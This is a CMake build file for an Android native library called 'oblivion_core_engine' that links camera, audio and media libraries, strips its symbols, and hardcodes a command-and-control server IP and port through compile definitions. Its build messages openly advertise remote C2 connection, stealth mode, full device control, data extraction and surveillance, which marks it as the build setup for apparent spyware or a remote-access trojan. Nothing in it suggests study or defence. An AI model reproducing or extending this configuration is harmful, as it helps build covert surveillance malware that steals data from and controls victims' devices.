cmake_minimum_required(VERSION 3.10)
project("oblivion_core_engine")

set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)

set(CMAKE_CXX_FLAGS "${CMAKE_CXX_FLAGS} -Wall -Wextra -O3 -fvisibility=hidden -fPIC -funroll-loops -pipe")

add_library(
    oblivion_core_engine
    SHARED
    oblivion_core_engine.cpp
)

target_include_directories(
    oblivion_core_engine
    PRIVATE
    ${CMAKE_CURRENT_SOURCE_DIR}
)

find_library(log-lib log)
find_library(android-lib android)
find_library(z-lib z)
find_library(dl-lib dl)
find_library(media-lib media)
find_library(camera-lib camera)
find_library(audio-lib audio)
find_library(mediandk-lib mediandk)

target_link_libraries(
    oblivion_core_engine
    ${log-lib}
    ${android-lib}
    ${z-lib}
    ${dl-lib}
    ${media-lib}
    ${camera-lib}
    ${audio-lib}
    ${mediandk-lib}
    -lOpenSLES
    -lGLESv2
    -lEGL
    -landroid
    -lstdc++
)

target_link_options(
    oblivion_core_engine
    PRIVATE
    -Wl,--exclude-libs,ALL
    -Wl,--no-undefined
    -Wl,--gc-sections
    -Wl,--strip-all
)

target_compile_definitions(
    oblivion_core_engine
    PRIVATE
    -DUSE_REMOTE_C2=1
    -DC2_IP=\"197.136.58.40\"
)

message(STATUS "==================================================")
message(STATUS "🔥 OBLIVION CORE ENGINE BUILD")
message(STATUS "==================================================")
message(STATUS "C2 IP: 197.136.58.40")
message(STATUS "C2 Port: 8000")
message(STATUS "Features:")
message(STATUS "  ✅ Remote C2 Connection")
message(STATUS "  ✅ Stealth Mode")
message(STATUS "  ✅ Full Device Control")
message(STATUS "  ✅ Data Extraction")
message(STATUS "  ✅ Surveillance")
message(STATUS "==================================================")